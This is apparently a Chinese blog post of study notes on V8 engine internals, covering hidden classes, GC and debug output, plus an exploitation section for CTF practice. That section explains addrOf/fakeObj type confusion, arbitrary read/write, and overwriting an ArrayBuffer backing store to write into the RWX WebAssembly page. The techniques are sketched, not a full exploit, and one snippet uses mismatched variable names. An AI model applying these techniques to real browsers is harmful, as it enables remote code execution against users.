<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x2098001cc051</span><br><span class="line">0x2098001cc051: [PropertyArray]</span><br><span class="line"> - map: 0x209800000941 &lt;Map(PROPERTY_ARRAY_TYPE)&gt;</span><br><span class="line"> - length: 3</span><br><span class="line"> - <span class="built_in">hash</span>: 0</span><br><span class="line">           0: 333</span><br><span class="line">         1-2: 0x209800000061 &lt;undefined&gt;</span><br><span class="line">pwndbg&gt; x/8wx 0x2098001cc051-1</span><br><span class="line">0x2098001cc050:	0x00000941	0x00000006	0x0000029a	0x00000061</span><br><span class="line">0x2098001cc060:	0x00000061</span><br></pre></td></tr></table></figure>

<p>map 中 unused property fields: 2，代表properties中还可以写入</p>
<p>key寻址依然使用map进行寻找。</p>
<h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>map 一般也称为 HiddenClass，它描述了对象的元信息，比如对象的大小（instance_size）等等。</p>
<p>map 也是继承自 <code>HeapObject</code>，因此它本身也是受 GC 管理的对象，JSObject 中的 map 字段是指向堆上的 map 对象的指针。</p>
<p>V8 会为每个对象创建一个隐藏类，对象的隐藏类中记录了该对象一些基础的布局信息，包括以下两点</p>
<ul>
<li>对象中所包含的所有的属性；</li>
<li>每个属性相对于对象的偏移量。</li>
</ul>
<p>HidenClass</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0346000007b1</span><br><span class="line">0x346000007b1: [Map] <span class="keyword">in</span> ReadOnlySpace</span><br><span class="line"> - map: 0x0346000004c5 &lt;MetaMap (0x03460000007d &lt;null&gt;)&gt;</span><br><span class="line"> - <span class="built_in">type</span>: HEAP_NUMBER_TYPE</span><br><span class="line"> - instance size: 12</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x034600000061 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0</span><br><span class="line"> - instance descriptors (own) <span class="comment">#0: 0x034600000701 &lt;DescriptorArray[0]&gt;</span></span><br><span class="line"> - prototype: 0x03460000007d &lt;null&gt;</span><br><span class="line"> - constructor: 0x03460000007d &lt;null&gt;</span><br><span class="line"> - dependent code: 0x0346000006dd &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>

<p>Map</p>
<ul>
<li>type: 类型，决定元素是数字还是Object指针</li>
<li>inobject: 类内的元素</li>
<li>instance descriptors: k-v对，如object中表示</li>
<li>…</li>
</ul>
<h3 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h3><p>没有被root object引用的对象都会被gc释放</p>
<p>两个主要的GC: Major GC (major garbage collection) and Minor GC (minor garbage collection)</p>
<p>新生代两个内存区：Young space 和 Old space</p>
<h4 id="mark-sweep"><a href="#mark-sweep" class="headerlink" title="mark-sweep"></a>mark-sweep</h4><h4 id="scavenge"><a href="#scavenge" class="headerlink" title="scavenge"></a>scavenge</h4><p>GC两次没有被回收会放进Old-space</p>
<h3 id="V8-flags"><a href="#V8-flags" class="headerlink" title="V8 flags"></a>V8 flags</h3><p>v8有很多好玩的flag</p>
<ul>
<li><code>--print-opt-code</code>:</li>
<li><code>--print-byte-code</code></li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="addrOf"><a href="#addrOf" class="headerlink" title="addrOf"></a>addrOf</h3><blockquote>
<p>return adress of a object：将一个Object对象以Double的形式打印出来。</p>
</blockquote>
<p>类型混淆：FixedArray -&gt; FixedDoubleArray</p>
<p>我们可以查看ObjectArray的内存布局</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; a = &#123;<span class="string">&quot;x&quot;</span>:1&#125;</span><br><span class="line">&#123;x: 1&#125;</span><br><span class="line">d8&gt; b = [a]</span><br><span class="line">pwndbg&gt; job 0x24d5001cbe05</span><br><span class="line">0x24d5001cbe05: [JSArray]</span><br><span class="line"> - map: 0x24d5000cf041 &lt;Map[16](PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x24d5000ce935 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x24d5001cbdf9 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x24d5000006cd &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x24d500000d41: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x24d50030f82d &lt;AccessorInfo name= 0x24d500000d41 &lt;String[6]: #length&gt;, data= 0x24d500000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x24d5001cbdf9 &lt;FixedArray[1]&gt; &#123;</span><br><span class="line">           0: 0x24d5001ca0f9 &lt;Object map = 0x24d5000da8bd&gt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>JSArray再次解引用 <code>elements</code> 中的元素，但是 <code>FixedDoubleArray</code> 直接取值</p>
<p>如果将<code>elements.map</code>修改为 <code>FixDoubleArray</code>，就会直接获得 object 的地址，而不解引用了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; <span class="built_in">let</span> c = [1.1]</span><br><span class="line">&gt; job 0x24d5001cbe61</span><br><span class="line">0x24d5001cbe61: [JSArray]</span><br><span class="line"> - map: 0x24d5000cefc1 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x24d5000ce935 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x24d5001cbe51 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x24d5000006cd &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x24d500000d41: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x24d50030f82d &lt;AccessorInfo name= 0x24d500000d41 &lt;String[6]: #length&gt;, data= 0x24d500000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x24d5001cbe51 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> *(int *)(0x24d5001cbdf9-1) = 0x851</span><br><span class="line">pwndbg&gt; job 0x24d5001cbdf9</span><br><span class="line">0x24d5001cbdf9: [FixedDoubleArray]</span><br><span class="line"> - map: 0x24d500000851 &lt;Map(FIXED_DOUBLE_ARRAY_TYPE)&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 1.79932e-308</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20wx 0x24d5001cbdf9-1</span><br><span class="line">0x24d5001cbdf8:	0x00000851	0x00000002	0x001ca0f9	0x000cf041  &lt;- 这里就是Object b起始地址</span><br></pre></td></tr></table></figure>

<p>第二中方法就是，将 Object 的 map 进行替换。个人分为是因为 <code>map.elements_kind: PACKED_DOUBLE_ELEMENTS</code></p>
<p>但是在 x64.debug下直接修改 Object b的map后报错，后来了解到是<code>DCHECK</code>宏的问题，它负责一些简单的安全检查。</p>
<p>查看两个对象</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x2cf0004be3d</span></span><br><span class="line">0x2cf0004be3d: [JSArray]</span><br><span class="line"> - map: 0x02cf0018f041 &lt;Map[16](PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02cf0018e935 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x02cf0004be31 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x02cf000006cd &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x2cf00000d41: [String] in ReadOnlySpace: #length: 0x02cf00025e2d &lt;AccessorInfo name= 0x02cf00000d41 &lt;String[6]: #length&gt;, data= 0x02cf00000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x02cf0004be31 &lt;FixedArray[1]&gt; &#123;</span><br><span class="line">           0: 0x02cf0004a0f5 &lt;Object map = 0x2cf00184955&gt;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x2cf0004bf89</span></span><br><span class="line">0x2cf0004bf89: [JSArray]</span><br><span class="line"> - map: 0x02cf0018efc1 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02cf0018e935 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x02cf0004bf79 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x02cf000006cd &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x2cf00000d41: [String] in ReadOnlySpace: #length: 0x02cf00025e2d &lt;AccessorInfo name= 0x02cf00000d41 &lt;String[6]: #length&gt;, data= 0x02cf00000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x02cf0004bf79 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>直接修改，job不会报错</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">ed 0x2cf0004be3d-1 0x018efc1</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x2cf0004be3d</span></span><br><span class="line">0x2cf0004be3d: [JSArray]</span><br><span class="line"> - map: 0x02cf0018efc1 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02cf0018e935 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x02cf0004be31 &lt;FixedArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x02cf000006cd &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x2cf00000d41: [String] in ReadOnlySpace: #length: 0x02cf00025e2d &lt;AccessorInfo name= 0x02cf00000d41 &lt;String[6]: #length&gt;, data= 0x02cf00000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x02cf0004be31 &lt;FixedArray[1]&gt; &#123;</span><br><span class="line">           0: 3.46785e-308</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>也可以访问</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">d8&gt; </span><span class="language-bash">console.log(b[0])</span>  </span><br><span class="line">3.467852523572752e-308</span><br></pre></td></tr></table></figure>

<h3 id="fakeObj"><a href="#fakeObj" class="headerlink" title="fakeObj"></a>fakeObj</h3><p>return object point to address</p>
<p>类型混淆: FixedDoubleArray -&gt; FixedArray</p>
<p>修改object或者object.elements 的 map</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以使用数组伪造一个结构体，然后进行fakeObj伪造一个Object。</p>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>可以使用<a target="_blank" rel="noopener" href="https://github.com/anonyco/WasmFiddlePlusPlus">WasmFiddlePlusPlus</a>，使用C语言生成wasm code</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// int main() &#123; return 42; &#125;</span></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code), &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> exp = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>会创建一个rwx的段（高版本不可写</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x189e4ff1f000</span>     <span class="number">0x189e4ff20000</span> rwxp     <span class="number">1000</span>      <span class="number">0</span> [anon_189e4ff1f]</span><br></pre></td></tr></table></figure>

<p>为什么不直接写wasm shellcode? WASM并不是汇编代码，而是 v8 会根据这段数据生成一段汇编然后加载到内存段中去执行，而检查该代码是否存在系统调用就发生在这一步。</p>
<p>有了 <code>addrOf</code> 和 <code>fakeObj</code> 原语，就可以进行任意地址读写，我们可以直接写内存，而不经过v8检查</p>
<h4 id="read64"><a href="#read64" class="headerlink" title="read64"></a>read64</h4><p>任意地址读</p>
<p>如下的布局</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">												fake_double_arr</span><br><span class="line">												↓</span><br><span class="line">elements -&gt; | <span class="number">32b</span>it elements map | <span class="number">32b</span>it length | <span class="number">64b</span>it double_array_map | data we write  </span><br><span class="line">arr      -&gt; | <span class="number">32b</span>it double_array map | <span class="number">32b</span>it properties | <span class="number">32b</span>it elements | <span class="number">32b</span>it length |JSArray</span><br></pre></td></tr></table></figure>

<ol>
<li>构造一个伪造的 DoubleArray</li>
<li>addrOf(arr) 计算出 伪造的 double_array 地址</li>
<li>fake_double_arr &#x3D; fakeObj(addr)</li>
<li>通过修改elements指针来进行任意的地址读 : <code>return f2i(fake_double_arr[idx])</code></li>
</ol>
<p>JSArray结构体–&gt; Map结构体–&gt;constructor结构体–&gt;code属性地址–&gt;code内存地址的固定偏移处保存了 v8 的二进制指令地址–&gt;v8 的 GOT 表–&gt; libc基址：</p>
<h4 id="write64"><a href="#write64" class="headerlink" title="write64"></a>write64</h4><p>任意地址写</p>
<p>类似的，最后一步是 <code>fake_double_arr[idx] = value</code></p>
<h4 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h4><p><code>ArrayBuffer</code> 对象用来表示通用的、固定长度的原始二进制数据缓冲区。</p>
<p>查看一下这个对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line">[object <span class="title class_">ArrayBuffer</span>]</span><br><span class="line">d8&gt; %<span class="title class_">DebugPrint</span>(ab)</span><br><span class="line"><span class="title class_">DebugPrint</span>: <span class="number">0x3a5d001ca105</span>: [<span class="title class_">JSArrayBuffer</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x3a5d000cc069</span> &lt;<span class="title class_">Map</span>[<span class="number">64</span>](<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x3a5d000cc13d</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3a5d000d94d1</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x3a5d000006cd</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - embedder <span class="attr">fields</span>: <span class="number">2</span></span><br><span class="line"> - <span class="attr">backing_store</span>: <span class="number">0x3a5e00000000</span></span><br><span class="line"> - <span class="attr">byte_length</span>: <span class="number">16</span></span><br><span class="line"> - <span class="attr">max_byte_length</span>: <span class="number">16</span></span><br><span class="line"> - detach <span class="attr">key</span>: <span class="number">0x3a5d00000061</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line"> - detachable</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x3a5d000006cd</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="title class_">All</span> own properties (excluding elements): &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    <span class="number">0</span>, aligned <span class="attr">pointer</span>: (nil)</span><br><span class="line">    <span class="number">0</span>, aligned <span class="attr">pointer</span>: (nil)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>这个 <code>backing_store</code> 就是我们实际写入内容的起始地址</p>
<p><code>ArrayBuffer</code> 不能直接操作，而是要通过类型数组对象或 <code>DataView</code> 对象来操作，它们会将缓冲区中的数据表示为特定的格式，并通过这些格式来读写缓冲区的内容。</p>
<p><code>DataView</code> 是一个可以从 <code>ArrayBuffer</code> 对象中读写多种数值类型的底层接口，使用它时，不用考虑不同平台的字节序问题。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab);</span><br><span class="line">dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, <span class="number">0xdeadbeef</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dv.<span class="title function_">getUint16</span>(<span class="number">2</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(ab);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>写入buffer</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x3976001ca195</span></span><br><span class="line"><span class="number">0x3976001ca195</span>: [JSArrayBuffer]</span><br><span class="line"> - map: <span class="number">0x3976000cc069</span> &lt;Map[<span class="number">64</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x3976000cc13d</span> &lt;Object map = <span class="number">0x3976000d94d1</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x3976000006cd</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: <span class="number">2</span></span><br><span class="line"> - backing_store: <span class="number">0x397700000000</span></span><br><span class="line"> - byte_length: <span class="number">256</span></span><br><span class="line"> - max_byte_length: <span class="number">256</span></span><br><span class="line"> - detach key: <span class="number">0x397600000061</span> &lt;undefined&gt;</span><br><span class="line"> - detachable</span><br><span class="line"> - properties: <span class="number">0x3976000006cd</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own <span class="built_in">properties</span> (excluding elements): &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    <span class="number">0</span>, aligned pointer: (nil)</span><br><span class="line">    <span class="number">0</span>, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tele <span class="number">0x397700000000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x397700000000</span> ◂— <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x397700000008</span> ◂— <span class="number">0</span></span><br><span class="line">... ↓     <span class="number">6</span> skipped</span><br></pre></td></tr></table></figure>

<p>存在任意地址写，我们如果修改ArrayBuffer Object 的 backing_store,就可以往wasm段写入</p>
<h4 id="JSTypedArray"><a href="#JSTypedArray" class="headerlink" title="JSTypedArray"></a>JSTypedArray</h4><p>如何解析buffer中的内容</p>
<p>浮点数和整数进行转化</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数  </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">v</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    bigUint64[<span class="number">0</span>] = v;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">v</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span>.<span class="title function_">concat</span>(v.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="WebAssmbly"><a href="#WebAssmbly" class="headerlink" title="WebAssmbly"></a>WebAssmbly</h2><h2 id="StarCTF-oob"><a href="#StarCTF-oob" class="headerlink" title="StarCTF oob"></a>StarCTF oob</h2><p>经典的入门题目，参考<a target="_blank" rel="noopener" href="https://eastxuelian.nebuu.la/v8-pwn-0x00">V8 - PWN Chromium 0x00 - Starting with OOB (nebuu.la)</a></p>
<h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>x64.release支持job命令需要加入一点选项</p>
